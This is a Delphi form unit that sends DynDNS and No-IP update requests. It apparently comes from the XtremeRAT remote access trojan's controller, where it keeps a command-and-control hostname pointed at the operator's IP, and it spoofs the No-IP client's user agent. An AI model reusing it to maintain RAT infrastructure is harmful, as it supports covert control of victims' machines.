unit UnitUpdateIP;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Buttons, StdCtrls, jpeg, ExtCtrls;

type
  TFormUpdateIP = class(TForm)
    Panel1: TPanel;
    Image1: TImage;
    Button1: TButton;
    Button2: TButton;
    Edit1: TEdit;
    Label1: TLabel;
    Label2: TLabel;
    Edit2: TEdit;
    Label3: TLabel;
    Edit3: TEdit;
    Label4: TLabel;
    Edit4: TEdit;
    CheckBox1: TCheckBox;
    SpeedButton1: TSpeedButton;
    procedure SpeedButton1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    procedure DynDNSUpdate(DNSAddress, User, password, IP: string);
    procedure NoIPUpdate(DNSAddress, User, password, IP: string);
  end;

var
  FormUpdateIP: TFormUpdateIP;

implementation

{$R *.dfm}

uses
  IdTCPClient,
  UnitGetWAMip,
  Base64,
  UnitMain;

//////////////////////////////////////////////////////
////////////////// DynDNS Updater ////////////////////
//////////////////////////////////////////////////////

procedure TFormUpdateIP.Button1Click(Sender: TObject);
begin
  ModalResult := mrOK;
end;

procedure TFormUpdateIP.Button2Click(Sender: TObject);
begin
  ModalResult := mrCancel;
end;

procedure TFormUpdateIP.CheckBox1Click(Sender: TObject);
begin
  if CheckBox1.Checked then Edit4.PasswordChar := #0 else Edit4.PasswordChar:= '*';
end;

procedure TFormUpdateIP.DynDNSUpdate(DNSAddress, User, password, IP: string);
var
  IdTCPClient1: TIdTCPClient;
  i: integer;
begin
  IdTCPClient1 := TIdTCPClient.Create(nil);
  IdTCPClient1.Host := 'members.dyndns.org';
  IdTCPClient1.Port := 80;
  IdTCPClient1.Connect;
  i := 0;

  while (IdTCPClient1.Connected = false) and (i < 5) do
  begin
    sleep(200);
    inc(i);
  end;

  try
    IdTCPClient1.IOHandler.WriteLn('GET /nic/update?hostname=' + DNSAddress +
                        '&myip=' + IP +
                        '&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG HTTP/1.0' + #13#10 +
                        'Host: members.dyndns.org' + #13#10 +
                        'Authorization: Basic ' + Base64Encode(User + ':' + password) + #13#10 +
                        'User-Agent: XtremeRAT' + #13#10#13#10);
    except
  end;

  if IdTCPClient1.Connected then IdTCPClient1.Disconnect;
  IdTCPClient1.Free;
end;

procedure TFormUpdateIP.FormCreate(Sender: TObject);
var
  i: integer;
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  FormMain.ImageListDiversos.GetBitmap(78, SpeedButton1.Glyph);

  i := Self.Width - (button1.Width + button2.Width + 20);
  button1.left := i div 2;
  button2.Left := button1.Left + button1.Width + 20;
end;

/////////////////////////////////////////////////////
////////////////// No-IP Updater ////////////////////
/////////////////////////////////////////////////////

procedure  TFormUpdateIP.NoIPUpdate(DNSAddress, User, password, IP: string);
var
  IdTCPClient1: TIdTCPClient;
  i: integer;
begin
  IdTCPClient1 := TIdTCPClient.Create(nil);
  IdTCPClient1.Host := 'dynupdate.no-ip.com';
  IdTCPClient1.Port := 8245;
  IdTCPClient1.Connect;
  i := 0;

  while (IdTCPClient1.Connected = false) and (i < 5) do
  begin
    sleep(200);
    inc(i);
  end;

  try
    IdTCPClient1.IOHandler.WriteLn('GET /ducupdate.php?username=' + User + '&pass=' + password + '&h[]=' +
                         DNSAddress + '&ip=' + IP + ' HTTP/1.0'+#13#10 +
                         'Accept: */*' + #13#10 +
                         'User-Agent: DUC v2.2.1' + #13#10 +
                         'Host: ' + 'dynupdate.no-ip.com' + #13#10+
                         'Pragma: no-cache'+#13#10#13#10);
    except
  end;

  if IdTCPClient1.Connected then IdTCPClient1.Disconnect;
  IdTCPClient1.Free;
end;

procedure TFormUpdateIP.SpeedButton1Click(Sender: TObject);
begin
  edit1.Text := GetWanIP;
end;

end.
